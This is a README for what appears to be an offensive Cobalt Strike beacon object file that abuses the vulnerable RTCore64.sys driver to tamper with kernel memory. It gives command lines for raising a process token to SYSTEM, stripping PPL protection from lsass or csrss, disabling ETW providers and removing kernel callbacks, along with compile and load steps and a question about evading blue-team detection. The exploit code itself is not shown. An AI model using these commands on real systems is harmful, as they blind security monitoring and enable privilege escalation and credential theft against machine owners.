# byovd-rtcore64-exploit
Capabilities not limited to elevating the target process' token similar to SYSTEM.exe through modification of kernel memory with the help of the RTCore64.sys vulnerable driver.

> This operation requires LOCAL admin privileges.

## Arguments
`<actions>` : choose on the following - unrestricttoken | setintegritylevel | settokenhighprivs | elevate2system | flipprocprotection | etwdisable | callbacks
`<targetPid>` : the target PID to modify the token configuration.
`<prot_type>` : When flipping the process protection , choose whether to flip to Process Protection Light or Process Protection.
`<etwListTxt>` : A text file containing the ETW Providers to disable based on a specific operation executed after this.
`<pers>` : status whether the service will persist or not.

## Usage - How to not use a param? How to use different param on a different obj
* `byovd-rtcore64-exploit elevate2system 8917 TRUE`
* `byovd-rtcore64-exploit settokenhighprivs 614 FALSE`
* `byovd-rtcore64-exploit setintegritylevel 7957 TRUE`
* `byovd-rtcore64-exploit unrestricttoken 2543 TRUE`

// ====================== Ignore these for now ==================
* `byovd-rtcore64-exploit flipprocprotection <lsass|csrss>.exe ppl FALSE`
* `byovd-rtcore64-exploit flipprocprotection <lsass|csrss>.exe pp TRUE`
* `byovd-rtcore64-exploit etwdisable providerListDisable.txt FALSE` ## the list.txt file contains the Providers after Post-Ex enum 
* `byovd-rtcore64-exploit callback list object FALSE`
* `byovd-rtcore64-exploit callback list process FALSE`
* `byovd-rtcore64-exploit callback list thread FALSE`
* `byovd-rtcore64-exploit callback list registry FALSE`
* `byovd-rtcore64-exploit callback remove registry RTCore64.sys TRUE`
* `byovd-rtcore64-exploit callback remove thread RTCore64.sys TRUE`
// =================================================================

## Example
* `byovd-rtcore64-exploit`

## Questions:
* Why use this technique?
* On what specific condition will this technique be effective?
* How to prevent the blue team from detecting this kind of technique? Both on the fly and post-execution?


## Compile
- 1\. Make sure Visual Studio is installed and supports C/C++.
- 2\. Open the `x64 Native Tools Command Prompt for VS <2019/2022>` terminal.
- 3\. Run the `bofcompile.bat` script to compile the object file. 
- 4\. In Cobalt strike, use the script manager to load the .cna script to import the tool.  // how to use Aggressor script in Powershell Empire?
